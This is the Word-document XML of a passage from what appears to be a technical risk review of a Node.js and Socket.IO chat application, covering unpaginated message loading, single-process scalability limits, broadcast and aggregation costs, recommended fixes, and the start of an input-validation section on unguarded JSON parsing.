      <w:r>
        <w:t>5.3 Threat Scenario</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="441032AA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. A group chat accumulates 50,000 messages over several months. 2. A user opens the chat, triggering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /api/message/:chatId</w:t>
      </w:r>
      <w:r>
        <w:t>. 3. The server attempts to load all 50,000 documents into memory. 4. Server memory spikes, potentially causing other requests to be delayed or rejected. 5. The 50,000-message JSON response takes several seconds to transmit. 6. The client browser becomes unresponsive while parsing and rendering the data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C747A4D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc240065729"/>
      <w:r>
        <w:t>5.4 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="5B84ADF1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$addToSet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> operator prevents duplicate entries in both arrays. - Application code consistently updates both </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> together. - Message deletion handlers update </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>latestMessage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the previous message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C11EBD1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc240065730"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>5.5 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/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B2F5B" w14:paraId="3E2B9564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26906EAB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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0DF26360" w14:textId="77777777" w:rsidR="00CB2F5B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26DB17C5" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="70A7BD51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0EF957" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement cursor-based pagination for message history (limit 50 per request)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E805A8B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1E5B77" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="4FBA2FA6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6E16CB80" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add a Mongoose custom validator to enforce </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>readBy ⊆ deliveredTo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> at schema level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B89F019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5CCDFFF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70DCEE3E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C2D071" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add database indexes on </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Message.chat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9"/>
              </w:rPr>
              <w:t>Message.createdAt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> for efficient paginated queries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C3506D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F1231D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1FB18EF3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66ACB123" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement virtual scroll in the frontend to render only visible messages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A148C38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1540786" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79C5CFFF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="34C97408" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc240065731"/>
      <w:r>
        <w:t>6. Risk Area 5: Scalability Constraints</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="2F751D44" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF082AF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="30" w:name="_Toc240065732"/>
      <w:r>
        <w:t>6.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="30"/>
    </w:p>
    <w:p w14:paraId="37D24A44" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>The current architecture is designed for single-process, single-server deployment, which limits horizontal scalability and imposes performance ceilings as the user base grows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1977F29D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc240065733"/>
      <w:r>
        <w:t>6.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="29A337B2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Constraint A — Single Process Architecture:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759C6627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server.js:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const server = app.listen(PORT, ...);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const io = require("socket.io")(server, ...);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C07D2BE" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The entire application — HTTP server, Socket.IO engine, and in-memory state — runs within a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>single Node.js process</w:t>
      </w:r>
      <w:r>
        <w:t>. This means: - Only one CPU core is utilized, regardless of the server hardware's multi-core capability. - A single CPU-intensive operation (e.g., large aggregation query) blocks the event loop for all connected users. - There is no fault tolerance; a crash takes down the entire service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232C7E25" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Constraint B — Global Broadcast for Status Changes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF010FA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server.js — User status change broadcast:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>io.emit("user status change", {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    userId,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    status: "online",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    lastSeen: now,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C84839" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>io.emit()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> broadcasts to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>every connected socket</w:t>
      </w:r>
      <w:r>
        <w:t>. With N users online, each status change generates N WebSocket write operations. For frequent status transitions (users going active/away repeatedly), this creates O(N) network overhead per event.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8780DC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Constraint C — Per-Request Aggregation for Unread Counts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F673CB4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chatControllers.js — fetchChats:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const unreadCounts = await Message.aggregate([</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        $match: {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            chat: { $in: chatIds },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            sender: { $ne: req.user._id },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            readBy: { $ne: req.user._id },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            isSystemMessage: { $ne: true },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">            deletedFor: { $ne: req.user._id },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    { $group: { _id: "$chat", count: { $sum: 1 } } },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6690BBDA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This aggregation pipeline runs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on every `GET /api/chat` request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for every user. With M chats and K messages, the pipeline scans up to M×K message documents per request. For a user with 50 chats and 10,000 total messages, this represents significant database I/O per page load.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59837AC7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc240065734"/>
      <w:r>
        <w:t>6.3 Scaling Ceiling Estimates</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/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B2F5B" w14:paraId="4A816041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240A034E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000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2F2D871A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Current Capacity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00A4BA07" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bottleneck</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="0A7D693D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05682EA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Concurrent WebSocket connections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1E9467D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>~1,000-5,000 per process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421070" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Single Node.js event loop + memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="304ACE29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83B06C1" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Message throughput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B7ED96D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>~500-1,000 messages/second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C681718" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Database write latency + broadcast fanout</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="3C816465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0D3B796" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Status broadcast overhead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536D448" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>O(N) per status change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7A7903" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>io.emit()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> to all sockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="787131F1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AF55DB8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Unread count query time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2192C51" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>O(M×K) per user page load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AC5FC69" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MongoDB aggregation without indexes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2995D6AD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="74596284" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc240065735"/>
      <w:r>
        <w:t>6.4 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="24256095" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>- Node.js's non-blocking I/O handles concurrent connections efficiently for small-to-medium user bases. - MongoDB's WiredTiger engine provides efficient read performance for moderate data volumes. - Socket.IO's internal buffering handles burst traffic gracefully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F70D12" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc240065736"/>
      <w:r>
        <w:t>6.5 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/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B2F5B" w14:paraId="441B65BD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48BD3651" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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1DD9A5E8" w14:textId="77777777" w:rsidR="00CB2F5B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41BE7F03" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="041107D3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1AE0B8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement Node.js clustering (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>cluster</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> module) to utilize multiple CPU cores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42BE39D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C7BFAC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="3420E49A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C65D111" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Use Redis as Socket.IO adapter for multi-process WebSocket state sharing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912417C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C66F064" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="422F9F5D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CEEAB3A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Cache unread counts in Redis, update incrementally on message events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2BD49F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8897AC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="13CB0AF3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3801929F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Replace global </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>io.emit()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> with targeted room-based broadcasts for status changes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F629D74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53F2DC0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5161E01F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F6FCAD7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add database indexes on frequently queried fields (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>chat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sender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readBy</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>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EC58DA5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BD7D060" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32DFD8CF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="508D44FB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc240065737"/>
      <w:r>
        <w:t>7. Risk Area 6: Input Validation &amp; Error Handling</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="569C2B79" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟢 LOW-MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403C9613" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc240065738"/>
      <w:r>
        <w:t>7.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="6F563DED" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Several API endpoints accept user input with minimal validation, relying on framework defaults and database constraints rather than explicit input sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A92A3EF" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc240065739"/>
      <w:r>
        <w:t>7.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="46A7E4F6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability A — Unsafe JSON Parsing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320782BE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chatControllers.js, line 230:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>var users = JSON.parse(req.body.users);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652F708A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>JSON.parse()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> throws a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
